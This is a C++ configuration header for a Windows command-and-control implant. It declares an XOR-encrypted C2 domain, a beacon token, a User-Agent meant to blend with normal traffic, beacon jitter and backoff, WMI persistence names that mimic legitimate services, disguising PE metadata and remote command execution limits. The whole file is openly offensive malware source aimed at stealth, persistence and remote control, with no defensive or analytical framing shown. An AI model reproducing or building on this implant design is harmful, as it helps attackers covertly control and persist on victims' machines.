#pragma once
#include <string>
#include <cstdint>

namespace config {

    // -----------------------------------------------------------------------
    // C2 connection
    // -----------------------------------------------------------------------

    // XOR-encrypted C2 domain — decrypted at runtime with hostname hash key
    extern const uint8_t C2_DOMAIN_ENCRYPTED[];
    extern const size_t  C2_DOMAIN_LEN;
    extern const uint16_t C2_PORT;

    // Authentication token sent in X-Beacon-Token header.
    // Must match GHOST_BEACON_TOKEN on the server.
    extern const wchar_t* BEACON_TOKEN;

    // User-Agent string for WinHTTP — blend with legitimate traffic
    extern const wchar_t* USER_AGENT;

    // -----------------------------------------------------------------------
    // Beacon timing
    // -----------------------------------------------------------------------

    // Jitter range in seconds — sleep between beacons is uniform [MIN, MAX]
    constexpr uint32_t BEACON_MIN = 45;
    constexpr uint32_t BEACON_MAX = 180;

    // Max consecutive beacon failures before backing off
    constexpr uint32_t MAX_FAILURES = 5;

    // Backoff multiplier — sleep *= BACKOFF_FACTOR after MAX_FAILURES
    constexpr uint32_t BACKOFF_FACTOR = 3;

    // -----------------------------------------------------------------------
    // WMI persistence identifiers (mimic legitimate services)
    // -----------------------------------------------------------------------

    extern const wchar_t* WMI_CONSUMER_NAME;
    extern const wchar_t* WMI_FILTER_NAME;
    extern const wchar_t* WMI_BINDING_NAME;

    // -----------------------------------------------------------------------
    // Implant metadata — embedded in PE version info
    // -----------------------------------------------------------------------

    extern const wchar_t* PRODUCT_NAME;
    extern const wchar_t* FILE_DESCRIPTION;
    extern const wchar_t* COMPANY_NAME;

    // -----------------------------------------------------------------------
    // Command execution
    // -----------------------------------------------------------------------

    // Max output bytes captured from a single command execution
    constexpr DWORD CMD_OUTPUT_MAX = 65536;

    // Timeout in ms for waiting on child process
    constexpr DWORD CMD_TIMEOUT_MS = 30000;
}